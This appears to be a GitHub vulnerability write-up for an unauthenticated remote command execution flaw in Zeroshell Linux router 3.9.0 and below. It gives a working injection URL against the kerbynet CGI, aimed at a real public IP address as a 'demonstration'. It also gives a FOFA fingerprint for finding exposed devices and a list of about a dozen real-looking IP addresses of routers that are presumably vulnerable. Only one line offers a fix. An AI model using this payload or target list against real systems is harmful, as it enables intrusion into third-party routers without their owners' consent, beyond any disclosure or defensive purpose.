# Zeroshell Linux router has a RCE vulnerability

## Introduce

Zeroshell official website：https://zeroshell.org/

There is a RCE vulnerability in Zeroshell Linux router.

Hackers can directly cause code execution vulnerabilities without logging in.

- This vulnerability affects zeroshell linux router version 3.9.0 and below.

## Vulnerability Example

Demonstration website: https://190.85.126.182:8081/


Under normal circumstances, you need to enter a password to login

![](https://github.com/HyCXSS/zeroshellrcecve/blob/main/img/1.png)


this payload may cause RCE:

https://190.85.126.182:8081/cgi-bin/kerbynet?Action=x509export&Format=der%0Aid%0A&Section=NoAuthREQ&x509cn=&x509type=CRL

A file named x509crl.crl will be downloaded. The file is the result of command execution (such as ID command in the example)

![](https://github.com/HyCXSS/zeroshellrcecve/blob/main/img/2.png)


## How to find vulnerability

You can search for these zeroshell products in fofa(https://fofa.so/)

fingerprint : app="Zeroshell-防火墙"


For Example:

https://95.253.87.129:8443/

https://95.87.203.184/

https://61.177.121.180/

https://185.90.209.1/

https://210.5.178.186:444/

https://80.116.165.240/

https://2.234.55.16:444/

https://138.41.26.66/

https://212.210.207.26:446/

https://190.85.126.182:8081/

https://62.147.209.59/

https://77.242.140.194:4443/

https://77.242.140.194:4443/


## Repair suggestions

Add permission verification to some parameters to prevent command execution
